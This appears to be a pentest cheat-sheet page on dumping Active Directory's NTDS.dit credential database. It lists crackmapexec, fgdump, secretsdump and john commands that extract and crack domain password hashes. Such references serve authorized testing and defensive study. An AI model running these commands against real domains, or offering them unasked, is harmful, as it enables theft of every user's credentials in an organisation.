# Dumping NTDS.dit

<details>

<summary>What is NTDS.dit ?</summary>

The NTDS file is the **database for Microsoft's Active Directory**. The NTDS file is stored on each domain controller and is created when a Windows server is promoted to domain controller. Its default location is: %SystemRoot%\ntds\NTDS.DIT.

NTDS.dit contains all the info on the domain (hashes...).

</details>

## cme

```bash
# dump ntds on domain controller
cme smb $dc_ip -u $admin_user -p $pass --ntds
```

## FGDump

{% embed url="https://www.softpedia.com/get/Security/Security-Related/fgdump.shtml" %}
FGDump
{% endembed %}

```powershell
.\fgdump.exe
```

## secretsdump

```bash
# when you have the ntds.dit
./secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL
```

## Cracking the hashes

```bash
john --format=NT hash --show
```
